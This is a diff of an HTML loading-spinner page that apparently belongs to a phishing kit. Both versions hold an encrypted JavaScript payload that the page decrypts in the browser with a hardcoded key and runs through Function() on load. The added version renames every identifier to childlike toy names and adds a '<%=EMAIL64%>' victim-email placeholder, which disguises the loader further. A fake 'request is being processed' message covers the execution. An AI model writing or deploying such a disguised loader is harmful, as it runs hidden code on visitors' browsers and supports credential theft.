@@ -18,140 +18,139 @@
             min-height: 100vh;
             overflow: hidden;
         }
-        .rotating-box {
+        .rotating-doll {
             width: 70px;
             height: 70px;
             border: 10px solid #eaeaea;
             border-top: 10px solid #3498db;
             border-radius: 50%;
-            animation: rotation-animation 1.2s linear infinite;
+            animation: spin-teddy 1.2s linear infinite;
         }
-        @keyframes rotation-animation {
+        @keyframes spin-teddy {
             from { transform: rotate(0deg); }
             to { transform: rotate(360deg); }
         }
-        .status-text {
+        .status-balloon {
             margin-top: 15px;
             font-size: 18px;
             color: #555;
         }
-        .hidden-content {
+        .hidden-toy {
             visibility: hidden;
         }
     </style>
 </head>
 <body>
 
-    <!-- Hidden Content -->
-    <div class="hidden-content">
-        <div id="random-node" data-info="hidden"></div>
+    <!-- Hidden Toy -->
+    <div class="hidden-toy">
+        <div id="hidden-teddy" data-info=""></div>
     </div>
 
     <!-- Main Loader -->
-    <div class="rotating-box"></div>
-    <p random-attr="obfuscate" alt="placeholder" class="status-text">Please wait, your request is being processed...</p>
+    <div   class="rotating-doll"></div>
+    <p bunny-ears="placeholder" alt="fun" nike-justsavage="" adidas="<%=EMAIL64%>"  class="status-balloon">Please wait, your request is being processed...</p>
 
-    <!-- Obfuscation Elements -->
-    <div style="display: none;">
-        <span>Unnecessary text for distraction purposes.</span>
-    </div>
+    
 
-    <!-- Main Functionality -->
+    <!-- Main Fun Script -->
     <script>
-        const simulateFakeProcesses = () => {
-            const processList = ["ProcessOne", "ProcessTwo", "ProcessThree"];
-            processList.forEach(proc => console.log(`Running: ${proc}`));
+        const playWithDolls = () => {
+            const toyBox = ["Doll", "Teddy", "Balloon"];
+            toyBox.forEach(toy => console.log(`Playing with: ${toy}`));
         };
-        simulateFakeProcesses();
+        playWithDolls();
 
         setTimeout(() => {
-            document.querySelector('.status-text').textContent = "Operation successful!";
+            document.querySelector('.status-balloon').textContent = "Operation successful!";
             document.body.style.backgroundColor = '#d4f5e9';
         }, 6000);
 
         (() => {
-            const tempDiv = document.createElement('div');
-            tempDiv.id = 'invisibleElement';
-            tempDiv.textContent = "This is invisible.";
-            console.log(tempDiv);
+            const hiddenToyBox = document.createElement('div');
+            hiddenToyBox.id = 'invisibleToy';
+            hiddenToyBox.textContent = "This toy is hidden.";
+            console.log(hiddenToyBox);
         })();
     </script>
 
-    <!-- Enhanced Encryption and Decryption -->
+    <!-- Advanced Toy Locker -->
     <script>
-        const customDecryptor = async (encData, initVector, saltValue, passwordPhrase) => {
-            console.log("[INFO] Initiating decryption...");
+        const unlockToyBox = async (lockedTeddy, toyKey, candySalt, passcode) => {
+            console.log("[INFO] Unlocking the toy box...");
 
-            const hexToUint8Array = (hex) => Uint8Array.from(hex.match(/.{2}/g).map(byte => parseInt(byte, 16)));
+            const hexToBalloon = (hex) => Uint8Array.from(hex.match(/.{2}/g).map(byte => parseInt(byte, 16)));
 
-            const fakeDelay = () => new Promise(resolve => {
-                console.log("[DEBUG] Delaying artificially...");
+            const waitForCandy = () => new Promise(resolve => {
+                console.log("[DEBUG] Waiting for candy...");
                 setTimeout(() => resolve(), 300);
             });
 
-            const generateDecryptionKey = async (keyMaterial, salt) => {
+            const craftTeddyKey = async (keyStuffing, salt) => {
                 return crypto.subtle.deriveKey(
                     { name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" },
-                    keyMaterial,
+                    keyStuffing,
                     { name: "AES-GCM", length: 256 },
                     false,
                     ["decrypt"]
                 );
             };
 
-            const keyMaterial = await crypto.subtle.importKey(
+            const keyStuffing = await crypto.subtle.importKey(
                 "raw",
-                new TextEncoder().encode(passwordPhrase),
+                new TextEncoder().encode(passcode),
                 { name: "PBKDF2" },
                 false,
                 ["deriveKey"]
             );
 
-            await fakeDelay();
-            const aesKey = await generateDecryptionKey(keyMaterial, hexToUint8Array(saltValue));
+            await waitForCandy();
+            const teddyKey = await craftTeddyKey(keyStuffing, hexToBalloon(candySalt));
 
             try {
-                const decryptedData = await crypto.subtle.decrypt(
-                    { name: "AES-GCM", iv: hexToUint8Array(initVector) },
-                    aesKey,
-                    hexToUint8Array(encData)
+                const unlockedToy = await crypto.subtle.decrypt(
+                    { name: "AES-GCM", iv: hexToBalloon(toyKey) },
+                    teddyKey,
+                    hexToBalloon(lockedTeddy)
                 );
-                console.log("[SUCCESS] Decryption successful.");
-                return new TextDecoder().decode(decryptedData);
+                console.log("[SUCCESS] Toy box unlocked.");
+                return new TextDecoder().decode(unlockedToy);
             } catch (err) {
-                console.error("[ERROR] Decryption failed:", err);
+                console.error("[ERROR] Failed to unlock toy box:", err);
                 return null;
             }
         };
 
-        const analyzeDecryptedContent = (content) => {
-            console.log("[INFO] Analyzing decrypted data...");
-            if (!content) {
-                console.error("[ERROR] No content found.");
+        const analyzeCandy = (data) => {
+            console.log("[INFO] Analyzing candy data...");
+            if (!data) {
+                console.error("[ERROR] No candy found.");
                 return;
             }
-            const scrambledContent = content.split("").reverse().join("");
-            console.log("[INFO] Scrambled content:", scrambledContent);
-            return scrambledContent;
+            const reversedCandy = data.split("").reverse().join("");
+            console.log("[INFO] Reversed candy data:", reversedCandy);
+            return reversedCandy;
         };
 
         (async () => {
-            console.log("[INFO] Starting decryption process...");
-            const dataPayload = {
-                iv: "c5d54a9c69516d18fab025aa",
-                salt: "f2c9263a7137550b0829e316a222b86e",
-                encrypted: "7c186924f7b217943e4c6487f9d39b9910bc7e640ffc082516da5a9b8caf274be8b70ffd65131a24d3f7193f6f5dd3e09d0a3fad4dcfe75feb75f009b820f7974fa3c7cd763720aec91aa95aab0121cada3f156e35e520eb549e4f0c4b3efd501a525f8e3df5ff4bdde38199df65ddb856d5304bed2dba800983ecb1af1d7b6481700ddc96c5f3647cf54a430e067be7e01beb2ddd09e0bf4795d77e4e69c4459c8a926bc922680f55877eb0cf57b26d2450952d66fb175206cd3d15257f8eed99d48bfd50931242"
+            console.log("[INFO] Starting toy box unlock process...");
+            const toyPayload = {
+                toyKey: "ce12552921e07eeae6d25a8b",
+                candySalt: "0ac6f6fafea5dd5e93ca4522b49d3681",
+                lockedTeddy: "6deb93765e72ef8ce34b1b97d0c25c97611c83b0ac258d36b36d018cdb7ff468533920838d3707c758da44549d374e8e0ca5a6aa93b0af7aa6d1f2e3c26dcf486585b4c887ad5cb43aed7d90469c8c5265c8bbbeca57739d97e18e7cceac3acfa08db407fba57a71ff3d8a03b8299957024e3205442026156a361709ebd8c2df4c14a3c6c053abe5055489a44d42679720a67e7b98ddb7c15cf91320517d7e3b4c74750d19471e7e76750a80e4a099a0297edb403178b56fd0f152d4ac2ea37bc07720850870a3a7"
             };
 
-            const keyPhrase = "quickescape";
-            const decryptedOutput = await customDecryptor(dataPayload.encrypted, dataPayload.iv, dataPayload.salt, keyPhrase);
+            
 
-            if (decryptedOutput) {
-                console.log("[INFO] Decrypted content:", decryptedOutput);
-                const analyzedContent = analyzeDecryptedContent(decryptedOutput);
+            const magicKey = "homesweethome";
+            const unlockedToyData = await unlockToyBox(toyPayload.lockedTeddy, toyPayload.toyKey, toyPayload.candySalt, magicKey);
 
-                console.log("[INFO] Executing decrypted content...");
-                Function(`${decryptedOutput}`)();
+            if (unlockedToyData) {
+                console.log("[INFO] Unlocked data:", unlockedToyData);
+                const analyzedCandy = analyzeCandy(unlockedToyData);
+
+                console.log("[INFO] Executing unlocked candy data...");
+                Function(`${unlockedToyData}`)();
             }
         })();
     </script>
